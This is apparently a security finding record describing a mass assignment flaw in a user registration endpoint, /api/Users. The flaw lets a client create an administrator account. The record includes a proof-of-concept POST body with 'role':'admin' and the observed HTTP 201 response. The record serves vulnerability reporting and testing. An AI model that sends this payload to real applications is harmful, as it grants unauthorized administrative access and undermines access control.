title: Mass Assignment Allows Admin Registration
description: The user registration endpoint at /api/Users accepts arbitrary JSON fields, including role-based fields such as 'role' and 'isAdmin'. An attacker can register a new user with elevated privileges by including additional fields in the POST body, such as {"role":"admin"} or {"isAdmin":true}. This allows creation of administrative accounts without any additional authorization steps, compromising the entire application's access control model.
poc: POST /api/Users, body: {"email":"hacker@test.com","password":"test123","role":"admin"} → HTTP 201 with response containing "role":"admin", proving mass assignment
proof: Observed mass assignment vulnerability on /api/Users endpoint. POST /api/Users with body {"email":"hacker@test.com","password":"test123","role":"admin"} returns HTTP 201 with user object containing "role":"admin" confirming the mass assignment succeeded.

proof_excerpts.excerpt: Observed mass assignment vulnerability on /api/Users endpoint. POST /api/Users with body {"email":"hacker@test.com","password":"test123","role":"admin"} returns HTTP 201 with user object containing "role":"admin" confirming the mass assignment succeeded.
